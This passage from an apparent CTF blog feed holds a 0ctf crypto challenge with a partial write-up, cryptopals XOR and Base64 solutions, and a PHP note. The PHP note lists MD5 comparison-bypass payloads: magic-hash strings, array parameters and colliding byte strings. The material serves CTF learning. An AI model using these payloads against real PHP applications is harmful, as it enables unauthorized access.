class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process1</span>(<span class="params">m, k</span>):</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bin</span>(k)[<span class="number">2</span>:]:</span><br><span class="line">        res = res &lt;&lt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">int</span>(i)):</span><br><span class="line">            res = res ^ m</span><br><span class="line">        <span class="keyword">if</span> (res &gt;&gt; <span class="number">128</span>):</span><br><span class="line">            res = res ^ P</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process2</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    res = []</span><br><span class="line">    res.append(process1(a[<span class="number">0</span>], b[<span class="number">0</span>]) ^ process1(a[<span class="number">1</span>], b[<span class="number">2</span>]))</span><br><span class="line">    res.append(process1(a[<span class="number">0</span>], b[<span class="number">1</span>]) ^ process1(a[<span class="number">1</span>], b[<span class="number">3</span>]))</span><br><span class="line">    res.append(process1(a[<span class="number">2</span>], b[<span class="number">0</span>]) ^ process1(a[<span class="number">3</span>], b[<span class="number">2</span>]))</span><br><span class="line">    res.append(process1(a[<span class="number">2</span>], b[<span class="number">1</span>]) ^ process1(a[<span class="number">3</span>], b[<span class="number">3</span>]))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nextrand</span>(<span class="params">rand</span>):</span></span><br><span class="line">    <span class="keyword">global</span> N, A, B</span><br><span class="line">    tmp1 = [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line">    tmp2 = [A, B, <span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line">    s = N</span><br><span class="line">    N = process1(N, N)</span><br><span class="line">    <span class="keyword">while</span> s:</span><br><span class="line">        <span class="keyword">if</span> s % <span class="number">2</span>:</span><br><span class="line">            tmp1 = process2(tmp2, tmp1)</span><br><span class="line">        tmp2 = process2(tmp2, tmp2)</span><br><span class="line">        s = s / <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> process1(rand, tmp1[<span class="number">0</span>]) ^ tmp1[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span>():</span></span><br><span class="line">    key = str2num(urandom(<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">yield</span> key</span><br><span class="line">        key = nextrand(key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">message</span>):</span></span><br><span class="line">    length = <span class="built_in">len</span>(message)</span><br><span class="line">    pad = <span class="string">&#x27;\x00&#x27;</span> + urandom(<span class="number">15</span> - (length % <span class="number">16</span>))</span><br><span class="line">    to_encrypt = message + pad</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    generator = keygen()</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;key.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="comment"># This is used to decrypt and of course you won&#x27;t get it.</span></span><br><span class="line">    <span class="keyword">for</span> i, key <span class="keyword">in</span> <span class="built_in">zip</span>(<span class="built_in">range</span>(<span class="number">0</span>, length, <span class="number">16</span>), generator):</span><br><span class="line">        f.write(<span class="built_in">hex</span>(key)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        res += num2str(str2num(to_encrypt[i:i+<span class="number">16</span>]) ^ key)</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">ciphertxt</span>):</span></span><br><span class="line">    <span class="comment"># TODO</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2num</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(s.encode(<span class="string">&#x27;hex&#x27;</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num2str</span>(<span class="params">n, block=<span class="number">16</span></span>):</span></span><br><span class="line">    s = <span class="built_in">hex</span>(n)[<span class="number">2</span>:].strip(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">    s = <span class="string">&#x27;0&#x27;</span> * ((<span class="number">32</span>-<span class="built_in">len</span>(s)) % <span class="number">32</span>) + s</span><br><span class="line">    <span class="keyword">return</span> s.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">P = <span class="number">0x100000000000000000000000000000087</span></span><br><span class="line">A = <span class="number">0xc6a5777f4dc639d7d1a50d6521e79bfd</span></span><br><span class="line">B = <span class="number">0x2e18716441db24baf79ff92393735345</span></span><br><span class="line">N = str2num(urandom(<span class="number">16</span>))</span><br><span class="line"><span class="keyword">assert</span> N != <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;top_secret&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        top_secret = f.read().strip()</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(top_secret) == <span class="number">16</span></span><br><span class="line">    plain = <span class="string">&quot;One-Time Pad is used here. You won&#x27;t know that the flag is flag&#123;%s&#125;.&quot;</span> % top_secret</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ciphertxt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(encrypt(plain).encode(<span class="string">&#x27;hex&#x27;</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>整个流程挺简单的, 就是对palin加密. 但是里面的每个函数都挺有意思的. 下面一个一个来分析</p><h1 id="process1-m-k"><a href="#process1-m-k" class="headerlink" title="process1(m,k)"></a>process1(m,k)</h1><p>先看<code>process1(m,k)</code><br>很多时候这种看着就像在一个域里面做的计算, 可以随便几个小的数进去看看结果是什么. 如果是一些简单的操作比如加减乘除啥的一般很容易能看出来.<br>而这个<code>process1(m,k)</code>就是在GF(2^128)下做<code>m*k</code>. 可以理解为就是一个乘法吧. </p><h4 id="为什么是个乘法呢"><a href="#为什么是个乘法呢" class="headerlink" title="为什么是个乘法呢?"></a>为什么是个乘法呢?</h4><p>平时纸上算乘法的时候都要用到竖式, 而这里的算法就是一个先计算高位的竖式.从最高位开始一位一位往下乘.(这个用纸上写出来会好理解吧, 这里就不写了</p><h1 id="process2-a-b"><a href="#process2-a-b" class="headerlink" title="process2(a,b)"></a>process2(a,b)</h1><p>这个函数就是个矩阵的乘法, 输出的就是 矩阵a * 矩阵b.</p><h4 id="怎么看出来"><a href="#怎么看出来" class="headerlink" title="怎么看出来?"></a>怎么看出来?</h4><p>经验? 一般遇到这种两个矩阵(数列)特定下标在进行加和乘计算的, 把每个式子写出来, 看能不能写成两个矩阵之间的操作, 而这里就是一个矩阵的乘法</p><h1 id="nextrand-rand"><a href="#nextrand-rand" class="headerlink" title="nextrand(rand)"></a>nextrand(rand)</h1><p>这个函数才是重点!!!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nextrand</span>(<span class="params">rand</span>):</span></span><br><span class="line">    <span class="keyword">global</span> N, A, B</span><br><span class="line">    tmp1 = [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line">    tmp2 = [A, B, <span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line">    s = N</span><br><span class="line">    N = process1(N, N)</span><br><span class="line">    <span class="keyword">while</span> s:</span><br><span class="line">        <span class="keyword">if</span> s % <span class="number">2</span>:</span><br><span class="line">            tmp1 = process2(tmp2, tmp1)</span><br><span class="line">        tmp2 = process2(tmp2, tmp2)</span><br><span class="line">        s = s / <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> process1(rand, tmp1[<span class="number">0</span>]) ^ tmp1[<span class="number">1</span>]</span><br></pre></td></tr></table></figure><p>看不懂的地方就是中间的循环结构, 不知道具体在干什么. 查了一下wp才知道, 这是个<strong>快速幂</strong>!!!没想到第一次接触快速幂是在密码的题目里…</p><h2 id="快速幂"><a href="#快速幂" class="headerlink" title="快速幂"></a>快速幂</h2><p>简单说一下快速幂吧, 计算机计算一个数的高次幂(例如3^60^)的时候, 如果直接计算60个3相乘就会特别慢, 但是可以把 3^60^ 化成 9^30^, 这样就只需要乘30次了.<br>继续算下去会发生一个问题 3^60^ = 9^30^ = 81^15^ 这里有个15次幂, 如果除以2就是7.5, 7.5次幂是没办法计算的. 所以这里有个操作, 就是81^15^ = 81^14^ * 81^1^, 然后继续对81^14^进行化简.<br>所以最终的结果就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">3^60 &#x3D; 9^30 &#x3D; 81^15 &#x3D; 81^14 * 81^1 &#x3D; 6561^7 + 81^1 &#x3D;....</span><br><span class="line">&#x3D; 43046721^3 * 43046721^1 * 6561^1 * 81^1</span><br><span class="line">&#x3D; 1853020188851841^1 * 43046721^1 * 6561^1 * 81^1</span><br></pre></td></tr></table></figure><p>可以看到结果有个特点, 就是最后一定会化成多个数的一次幂的乘积.而什么时候能分出一次幂呢? <strong>就是次幂为奇数的时候!!!</strong></p><h2 id="回到函数"><a href="#回到函数" class="headerlink" title="回到函数"></a>回到函数</h2><p>回到函数里, 结合上面说的快速幂的算法, 可以看出这个循环就是计算<br><code>tmp1 = tmp2^s</code>, </p><blockquote><p>未完待续….</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;0ctf quals 2017的题, 是之前做过的onetimepad的升级版. 因为这道题涉及到了有限域下乘法, 矩阵乘法, 快速幂, 离散对数, 所以记录一下(学费了学费了…&lt;/p&gt;
&lt;h2 id=&quot;题目源码&quot;&gt;&lt;a href=&quot;#题目源码&quot; class=&quot;header</summary>
      
    
    
    
    <category term="CryptoSummary" scheme="http://tearsjin.github.io/categories/CryptoSummary/"/>
    
    
    <category term="Crypto" scheme="http://tearsjin.github.io/tags/Crypto/"/>
    
    <category term="Summary" scheme="http://tearsjin.github.io/tags/Summary/"/>
    
  </entry>
  
  <entry>
    <title>PHP Weak type about MD5</title>
    <link href="http://tearsjin.github.io/2020/10/22/web-md5%E5%BC%B1%E7%B1%BB%E5%9E%8B/"/>
    <id>http://tearsjin.github.io/2020/10/22/web-md5%E5%BC%B1%E7%B1%BB%E5%9E%8B/</id>
    <published>2020-10-21T16:02:00.000Z</published>
    <updated>2021-03-13T03:06:58.931Z</updated>
    
    <content type="html"><![CDATA[<p>主要就是对一些在PHP中MD5值判断的漏洞的积累吧(<del>每次都要查payload很麻烦的</del></p><blockquote><p>为了方便, 文章中的所有变量都不带$</p></blockquote><h2 id="1-a-b-and-md5-a-md5-b"><a href="#1-a-b-and-md5-a-md5-b" class="headerlink" title="1. a != b and md5(a) == md5(b)"></a>1. a != b and md5(a) == md5(b)</h2><p>用==来判断两个变量(<del>这样写肯定会被学长骂的!!!</del>, 怎么绕过呢?<br>先给出两个字符串吧<code>QNKCDZO</code> 和 <code>240610708</code> 而这两个字符串的MD5值为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line"><span class="number">0e462097431906509019562988736854</span></span><br></pre></td></tr></table></figure><p>PHP在处理哈希字符串时, 它把每一个以“0E”开头的哈希值都解释为0, 具体的原因呢是因为0e开头会被认为是科学计数法, e后面的数会被认为是次幂, 而不管0乘10的几次幂都是0. 所以如果两个不同的密码经过哈希以后, 其哈希值都是以“0E”开头的, 那么PHP将会认为他们相同, 都是0.</p><h2 id="2-a-b-and-md5-a-md5-b"><a href="#2-a-b-and-md5-a-md5-b" class="headerlink" title="2. a !== b and md5(a) === md5(b)"></a>2. a !== b and md5(a) === md5(b)</h2><p>要通过这个判断, 要利用MD5不能处理数组这个漏洞, 就是说当a和b都是数组的时候, md5(a) === md5(b) 会判断为真. 至于怎么让a !== b, <code>a[]=1;b[]=2</code>就行了.</p><h2 id="3-string-a-string-b-and-md5-a-md5-b"><a href="#3-string-a-string-b-and-md5-a-md5-b" class="headerlink" title="3. (string)a !== (string)b and md5(a) === md5(b)"></a>3. (string)a !== (string)b and md5(a) === md5(b)</h2><p>啊这…这个可以直接去找两个相等md5的字符串.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Param1</span>=<span class="string">&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;</span>;</span><br><span class="line"><span class="variable">$Param2</span>=<span class="string">&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;</span>;</span><br><span class="line"><span class="comment">#008ee33a9d58b51cfeb425b0959121c9</span></span><br></pre></td></tr></table></figure><p>使用的时候记得直接添加到包里面去, 浏览器上输入是无效的</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;主要就是对一些在PHP中MD5值判断的漏洞的积累吧(&lt;del&gt;每次都要查payload很麻烦的&lt;/del&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;为了方便, 文章中的所有变量都不带$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;1-a-b-and-md5-a-md</summary>
      
    
    
    
    <category term="WebSummary" scheme="http://tearsjin.github.io/categories/WebSummary/"/>
    
    
    <category term="Web" scheme="http://tearsjin.github.io/tags/Web/"/>
    
    <category term="MD5" scheme="http://tearsjin.github.io/tags/MD5/"/>
    
  </entry>
  
  <entry>
    <title>cryptopals</title>
    <link href="http://tearsjin.github.io/2020/10/10/cryptopals/"/>
    <id>http://tearsjin.github.io/2020/10/10/cryptopals/</id>
    <published>2020-10-10T07:51:07.000Z</published>
    <updated>2021-03-13T03:02:33.382Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>开始学习cryptopals啦, 一题一题的做完它吧(也不知道能做多久…</p></blockquote><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><ul><li><a href="#1">cryptopals 1.1 - Convert hex to base64</a></li><li><a href="#2">cryptopals 1.2 - Fixed XOR</a></li><li><a href="#3">cryptopals 1.3 - Single-byte XOR cipher</a></li><li><a href="#4">cryptopals 1.4 - Detect single-character XOR</a></li><li><a href="#5">cryptopals 1.5 - Implement repeating-key XOR</a></li><li><a href="#6">cryptopals 1.6 - Break repeating-key XOR</a></li><li><a href="#7">cryptopals 1.7 - AES in ECB mode</a></li><li><a href="#7">cryptopals 1.8 - Detect AES in ECB mode</a></li></ul><p><a name='1'></a></p><h1 id="cryptopals-1-1-Convert-hex-to-base64"><a href="#cryptopals-1-1-Convert-hex-to-base64" class="headerlink" title="cryptopals 1.1 - Convert hex to base64"></a>cryptopals 1.1 - Convert hex to base64</h1><h2 id="challenge"><a href="#challenge" class="headerlink" title="challenge"></a>challenge</h2><p> The string:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">49276d206b696c6c696e6720796f757220627261696e206c696b65206120706f69736f6e6f7573206d757368726f6f6d</span><br></pre></td></tr></table></figure><p>Should produce:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SSdtIGtpbGxpbmcgeW91ciBicmFpbiBsaWtlIGEgcG9pc29ub3VzIG11c2hyb29t</span><br></pre></td></tr></table></figure><p>So go ahead and make that happen. You’ll need to use this code for the rest of the exercises. </p><p>大概就是手动写一个hex2base64的脚本吧</p><h2 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h2><p>写之前先去了解一下hex转base64的原理(wiki真不错<br><strong>Base64</strong>是一种基于64个可打印字符来表示二进制数据的表示方法。由于 $log _2 64=6$，所以每6个比特为一个单元，对应某个可打印字符。3个字节相当于24个比特，对应于4个Base64单元，即3个字节可由4个可打印字符来表示。<br><img src="http://47.98.130.190:8090/upload/2020/10/%E5%9B%BE%E7%89%87-5317dc14984d42eda2d1023d847d30d7.png" alt="图片.png"></p><p>转换的时候，将3字节的数据，先后放入一个24位的缓冲区中，先来的字节占高位。数据不足3字节的话，于缓冲器中剩下的比特用0补足。每次取出6比特，按照其值选择</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>中的字符作为编码后的输出，直到全部输入数据转换完成。</p><p>若原数据长度不是3的倍数时且剩下1个输入数据，则在编码结果后加2个=；若剩下2个输入数据，则在编码结果后加1个=。 </p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>知道原理就好写脚本了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding</span>(<span class="params">Hex</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(Hex) % <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">return</span> Hex + <span class="string">&#x27;0&#x27;</span> * (<span class="number">6</span> - <span class="built_in">len</span>(Hex) % <span class="number">6</span>)</span><br><span class="line">    <span class="keyword">return</span> Hex</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encodeb64</span>(<span class="params">Hex</span>):</span></span><br><span class="line">    Hex = padding(Hex)</span><br><span class="line">    output = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(Hex), <span class="number">6</span>):</span><br><span class="line">        buff = <span class="built_in">bin</span>(<span class="built_in">int</span>(Hex[i:i + <span class="number">6</span>], <span class="number">16</span>))[<span class="number">2</span>:]</span><br><span class="line">        buff = <span class="string">&#x27;0&#x27;</span> * (<span class="number">24</span> - <span class="built_in">len</span>(buff)) + buff</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(buff), <span class="number">6</span>):</span><br><span class="line">            value = <span class="built_in">int</span>(buff[j:j + <span class="number">6</span>], <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">if</span> value == <span class="number">0</span>:</span><br><span class="line">                output += <span class="string">&#x27;=&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> value &lt; <span class="number">26</span>:</span><br><span class="line">                output += <span class="built_in">chr</span>(value + <span class="number">65</span>)</span><br><span class="line">            <span class="keyword">elif</span> value &lt; <span class="number">52</span>:</span><br><span class="line">                output += <span class="built_in">chr</span>(value + <span class="number">71</span>)</span><br><span class="line">            <span class="keyword">elif</span> value &lt; <span class="number">62</span>:</span><br><span class="line">                output += <span class="built_in">str</span>(value - <span class="number">52</span>)</span><br><span class="line">            <span class="keyword">elif</span> value == <span class="number">62</span>:</span><br><span class="line">                output += <span class="string">&#x27;+&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                output += <span class="string">&#x27;/&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    Hex = <span class="string">&#x27;49276d206b696c6c696e6720796f757220627261696e206c696b65206120706f69736f6e6f7573206d757368726f6f6d&#x27;</span></span><br><span class="line">    print(encodeb64(Hex))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a name='2'></a></p><h1 id="cryptopals-1-2-Fixed-XOR"><a href="#cryptopals-1-2-Fixed-XOR" class="headerlink" title="cryptopals 1.2 - Fixed XOR"></a>cryptopals 1.2 - Fixed XOR</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p> Write a function that takes two equal-length buffers and produces their XOR combination.</p><p>If your function works properly, then when you feed it the string:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1c0111001f010100061a024b53535009181c</span><br></pre></td></tr></table></figure><p>… after hex decoding, and when XOR’d against:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">686974207468652062756c6c277320657965</span><br></pre></td></tr></table></figure><p>… should produce:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">746865206b696420646f6e277420706c6179</span><br></pre></td></tr></table></figure><p>相同长度的十六进制的xor, 一位一位的xor就行了吧</p><h2 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fixex_xor</span>(<span class="params">Hex1, Hex2</span>):</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(Hex1, Hex2):</span><br><span class="line">        res += <span class="built_in">hex</span>(<span class="built_in">int</span>(i, <span class="number">16</span>) ^ <span class="built_in">int</span>(j, <span class="number">16</span>))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    Hex1 = <span class="string">&#x27;1c0111001f010100061a024b53535009181c&#x27;</span></span><br><span class="line">    Hex2 = <span class="string">&#x27;686974207468652062756c6c277320657965&#x27;</span></span><br><span class="line">    print(fixex_xor(Hex1, Hex2))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><blockquote><p>还是比较简单的,后面就不一定了Orz<br><a name='3'></a></p></blockquote><h1 id="cryptopals-1-3-Single-byte-XOR-cipher"><a href="#cryptopals-1-3-Single-byte-XOR-cipher" class="headerlink" title="cryptopals 1.3 - Single-byte XOR cipher"></a>cryptopals 1.3 - Single-byte XOR cipher</h1><blockquote><p>从这里开始难度突然就上升了</p></blockquote><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p> The hex encoded string:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736</span><br></pre></td></tr></table></figure><p>… has been XOR’d against a single character. Find the key, decrypt the message.</p><p>You can do this by hand. But don’t: write code to do it for you.</p><p>How? Devise some method for “scoring” a piece of English plaintext. Character frequency is a good metric. Evaluate each output and choose the one with the best score. </p><p>说是一段文字被单个字符(8bit)异或加密了, 要找出这个字符然后输出明文, 密钥空间为$2^8$, 也不算多, 但是如何让程序找出唯一一个正确的字符?</p><p>提示上有提到可以利用解密后的字符串的”得分”. 查了一下, 在一个dalao的博客上找到的这个得分应该叫<strong>字符频率</strong>(dalao说wiki上有字符频率表, 但我没找到, 就连这个”得分”的相关内容都没找到), 但是还好他的博客里附带了一个字符频率的数组.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CHARACTER_FREQ = &#123; <span class="comment">#字符频率表, 出现一次某字母的得分</span></span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="number">0.0651738</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">0.0124248</span>, <span class="string">&#x27;c&#x27;</span>: <span class="number">0.0217339</span>, <span class="string">&#x27;d&#x27;</span>: <span class="number">0.0349835</span>, <span class="string">&#x27;e&#x27;</span>: <span class="number">0.1041442</span>, <span class="string">&#x27;f&#x27;</span>: <span class="number">0.0197881</span>, <span class="string">&#x27;g&#x27;</span>: <span class="number">0.0158610</span>,</span><br><span class="line">    <span class="string">&#x27;h&#x27;</span>: <span class="number">0.0492888</span>, <span class="string">&#x27;i&#x27;</span>: <span class="number">0.0558094</span>, <span class="string">&#x27;j&#x27;</span>: <span class="number">0.0009033</span>, <span class="string">&#x27;k&#x27;</span>: <span class="number">0.0050529</span>, <span class="string">&#x27;l&#x27;</span>: <span class="number">0.0331490</span>, <span class="string">&#x27;m&#x27;</span>: <span class="number">0.0202124</span>, <span class="string">&#x27;n&#x27;</span>: <span class="number">0.0564513</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>: <span class="number">0.0596302</span>, <span class="string">&#x27;p&#x27;</span>: <span class="number">0.0137645</span>, <span class="string">&#x27;q&#x27;</span>: <span class="number">0.0008606</span>, <span class="string">&#x27;r&#x27;</span>: <span class="number">0.0497563</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">0.0515760</span>, <span class="string">&#x27;t&#x27;</span>: <span class="number">0.0729357</span>, <span class="string">&#x27;u&#x27;</span>: <span class="number">0.0225134</span>,</span><br><span class="line">    <span class="string">&#x27;v&#x27;</span>: <span class="number">0.0082903</span>, <span class="string">&#x27;w&#x27;</span>: <span class="number">0.0171272</span>, <span class="string">&#x27;x&#x27;</span>: <span class="number">0.0013692</span>, <span class="string">&#x27;y&#x27;</span>: <span class="number">0.0145984</span>, <span class="string">&#x27;z&#x27;</span>: <span class="number">0.0007836</span>, <span class="string">&#x27; &#x27;</span>: <span class="number">0.1918182</span>&#125;</span><br></pre></td></tr></table></figure><p>通过这个字符频率表, 可以定量的分析每次解密结果的得分, 得分最高就代表最接近正常英文语句(或者说文章).</p><h2 id="脚本-2"><a href="#脚本-2" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 